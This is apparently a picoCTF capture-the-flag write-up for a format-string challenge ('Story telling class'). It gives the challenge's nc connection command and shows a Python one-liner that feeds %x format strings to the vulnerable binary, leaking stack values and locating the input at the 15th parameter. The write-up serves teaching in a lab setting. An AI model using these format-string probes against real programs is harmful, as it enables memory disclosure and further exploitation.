## Description

Story telling class 1/2.

I'm just copying and pasting with [this program](https://artifacts.picoctf.net/c/122/vuln). What can go wrong? 

You can view [source here](https://artifacts.picoctf.net/c/122/vuln.c). And connect with it using:

```
nc saturn.picoctf.net 57802
```

## Exploitation

If we send format strings into the program `stdin`, we see that the `AAAA` show up in the 15th parameter on the stack:

```bash
❯ python3 -c "print('AAAA' + 4 * '.%x.%x.%x.%x')" |  ./vuln
Tell me a story and then I'll tell you one >> Here's a story - 
AAAA.f7fa8723.0.f7ec90a7.12.7c.6f636970.656d6f73.a7d67.0.0.0.0.0.41414141.252e7825.2e78252e

python3 -c "print('AAAA' + 4 * '.%x.%x.%x.%x')" |  ./vuln | cut -d"." -f15
Tell me a story and then I'll tell you one >> Here's a story - 
41414141

```
